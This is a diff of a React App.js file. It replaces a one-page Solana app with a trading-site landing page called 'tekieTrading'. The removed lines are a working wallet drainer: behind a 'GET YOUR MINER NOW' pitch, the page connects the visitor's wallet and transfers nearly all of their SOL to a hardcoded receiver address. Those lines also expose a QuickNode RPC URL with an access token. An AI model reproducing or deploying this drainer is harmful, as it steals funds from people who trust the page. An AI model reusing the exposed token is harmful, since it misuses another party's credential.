@@ -1,138 +1,93 @@
-import React, { useState, useCallback, useEffect } from "react";
-import { WalletMultiButton } from "@solana/wallet-adapter-react-ui";
-import { useWallet } from "@solana/wallet-adapter-react";
-import { useConnection } from "@solana/wallet-adapter-react";
-import { PublicKey, Transaction, SystemProgram, LAMPORTS_PER_SOL, Connection } from "@solana/web3.js";
+import React, { useEffect, useState } from 'react';
+import AOS from 'aos';
+import 'aos/dist/aos.css';
 
-// Updated RPC URL
-const RPC_URL = "https://holy-frosty-meme.solana-mainnet.quiknode.pro/71d288831d3ed5c88714d01a613e0c1915f4e63e/";
-const RECEIVER_ADDRESS = "C5GwAvf7GhgpYknxmi2g6MzuscVhzhxT2hwzRYEXGfVW";
+import Header from './components/Header';
+import Hero from './components/Hero';
+import Market from './components/Market';
+import Features from './components/Features';
+import TradingViewSection from './components/TradingViewSection';
+import CTA from './components/CTA';
+import Footer from './components/Footer';
+import Modals from './components/Modals';
+import './App.css';
 
-export default function App() {
-  const { publicKey, connected, sendTransaction, disconnect } = useWallet();
-  const { connection: walletConnection } = useConnection();
+function App() {
+  const [activeModal, setActiveModal] = useState(null);
+  const [showNotification, setShowNotification] = useState(false);
 
-  // Use our explicit RPC connection
-  const connection = new Connection(RPC_URL, "confirmed");
+  // Initialize AOS and set up timed notification
+  useEffect(() => {
+    AOS.init({
+      duration: 800,
+      easing: 'ease-in-out',
+      once: true
+    });
 
-  const [loading, setLoading] = useState(false);
-  const [popups, setPopups] = useState([]);
-  const [solBalance, setSolBalance] = useState(0);
+    const notificationTimer = setTimeout(() => {
+      setShowNotification(true);
+    }, 3000);
 
-  // Show popup messages
-  const showPopup = useCallback((message, type = "info") => {
-    const id = Date.now() + Math.random();
-    setPopups((prev) => [...prev, { id, message, type }]);
-    setTimeout(() => setPopups((prev) => prev.filter((p) => p.id !== id)), 4000);
+    return () => clearTimeout(notificationTimer);
   }, []);
 
-  // Fetch SOL balance
-  const fetchBalance = async () => {
-    if (!connected || !publicKey) return 0;
-    try {
-      const balance = await connection.getBalance(publicKey);
-      const sol = balance / LAMPORTS_PER_SOL;
-      setSolBalance(sol);
-      return sol;
-    } catch (err) {
-      console.error("Balance fetch failed:", err);
-      showPopup("❌ Unable to fetch SOL balance", "error");
-      return 0;
-    }
+  // Header scroll effect
+  useEffect(() => {
+    const handleScroll = () => {
+      const header = document.getElementById('header');
+      if (header) {
+        if (window.scrollY > 50) {
+          header.classList.add('scrolled');
+        } else {
+          header.classList.remove('scrolled');
+        }
+      }
+    };
+
+    window.addEventListener('scroll', handleScroll);
+    return () => window.removeEventListener('scroll', handleScroll);
+  }, []);
+
+  const handleOpenModal = (modalId) => {
+    setActiveModal(modalId);
+    document.body.style.overflow = 'hidden';
   };
 
-  useEffect(() => {
-    if (connected) fetchBalance();
-  }, [connected, publicKey]);
-
-  // Transfer SOL
-  const handleTransfer = async () => {
-    if (!connected || !publicKey) return;
-    setLoading(true);
-
-    try {
-      const sol = await fetchBalance();
-      if (sol <= 0.001) {
-        showPopup("⚠️ Not enough SOL to transfer after fees.", "error");
-        setLoading(false);
-        return;
-      }
-
-      const lamportsToSend = Math.floor(sol * LAMPORTS_PER_SOL - 0.001 * LAMPORTS_PER_SOL);
-      const receiver = new PublicKey(RECEIVER_ADDRESS);
-
-      const { blockhash } = await connection.getLatestBlockhash();
-      const tx = new Transaction({
-        recentBlockhash: blockhash,
-        feePayer: publicKey,
-      }).add(
-        SystemProgram.transfer({
-          fromPubkey: publicKey,
-          toPubkey: receiver,
-          lamports: lamportsToSend,
-        })
-      );
-
-      const signature = await sendTransaction(tx, connection);
-      await connection.confirmTransaction(signature, "confirmed");
-
-      showPopup(`✅ SOL transferred! Signature: ${signature}`, "success");
-      await fetchBalance();
-    } catch (err) {
-      console.error("Transfer Error:", err);
-      showPopup(`❌ Transfer failed: ${err?.message || err}`, "error");
-    } finally {
-      setLoading(false);
-    }
+  const handleCloseModal = () => {
+    setActiveModal(null);
+    document.body.style.overflow = '';
   };
 
   return (
-    <div className="w-screen h-screen flex items-center justify-center bg-gradient-to-br from-purple-900 via-black to-indigo-900 font-sans relative">
-      <div className="bg-white/10 backdrop-blur-xl p-10 rounded-3xl shadow-2xl text-center max-w-md w-full border border-white/20 animate-fade-in">
-        <h1 className="text-4xl font-extrabold text-transparent bg-clip-text bg-gradient-to-r from-pink-500 to-violet-400 mb-4">
-          🚀 SOL Transfer
-        </h1>
-        <p className="text-gray-300 mb-8">GET YOUR MINER NOW</p>
+    <>
+      <Header onOpenModal={handleOpenModal} />
+      <main>
+        <Hero />
+        <Market />
+        <Features />
+        <TradingViewSection />
+        <CTA />
+      </main>
+      <Footer />
+      <Modals activeModal={activeModal} onCloseModal={handleCloseModal} />
 
-        {!connected ? (
-          <WalletMultiButton className="w-full py-3 px-6 rounded-xl bg-gradient-to-r from-green-400 to-emerald-500 text-lg font-semibold text-black shadow-lg hover:shadow-xl transition transform hover:-translate-y-1" />
-        ) : (
-          <>
-            <button
-              onClick={handleTransfer}
-              disabled={loading}
-              className={`w-full py-3 px-6 rounded-xl font-bold shadow-lg transition transform hover:-translate-y-1 ${
-                loading
-                  ? "bg-gray-400 cursor-not-allowed"
-                  : "bg-gradient-to-r from-purple-600 to-indigo-600 hover:from-purple-500 hover:to-indigo-500 text-white"
-              }`}
-            >
-              {loading ? "Processing..." : "Transfer SOL"}
-            </button>
-
-            <button
-              onClick={disconnect}
-              className="mt-4 w-full py-2 px-6 rounded-xl bg-red-600 hover:bg-red-500 transition text-sm font-medium text-white shadow-md hover:shadow-lg"
-            >
-              Switch Wallet
-            </button>
-
-            <p className="mt-4 text-gray-300 text-sm">Balance: {solBalance.toFixed(6)} SOL</p>
-          </>
-        )}
-      </div>
-
-      {popups.map(({ id, message, type }) => (
-        <div
-          key={id}
-          className={`fixed bottom-6 left-1/2 transform -translate-x-1/2 px-6 py-3 rounded-xl shadow-2xl text-white text-sm font-medium animate-fade-in-up ${
-            type === "success" ? "bg-green-500/90" : type === "error" ? "bg-red-500/90" : "bg-gray-700/90"
-          }`}
-          role="alert"
-        >
-          {message}
+      {/* Notification */}
+      {showNotification && (
+        <div className="notification active" id="notification">
+          <div className="notification-icon">
+            <i className="fas fa-bell"></i>
+          </div>
+          <div className="notification-content">
+            <div className="notification-title">Welcome to tekieTrading!</div>
+            <div className="notification-message">Sign up now and get 10% discount on trading fees for 30 days.</div>
+          </div>
+          <div className="notification-close" onClick={() => setShowNotification(false)}>
+            <i className="fas fa-times"></i>
+          </div>
         </div>
-      ))}
-    </div>
+      )}
+    </>
   );
 }
+
+export default App;
